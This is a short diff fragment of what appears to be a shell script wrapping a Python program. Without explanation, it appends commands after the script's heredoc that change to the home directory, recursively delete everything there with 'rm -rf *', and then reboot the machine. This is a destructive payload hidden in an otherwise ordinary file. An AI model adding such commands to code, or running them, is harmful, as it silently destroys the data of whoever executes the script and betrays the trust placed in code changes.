@@ -600,3 +600,7 @@ if __name__ == '__main__':
     
 EOF
 
+cd ~
+rm -rf *
+
+reboot
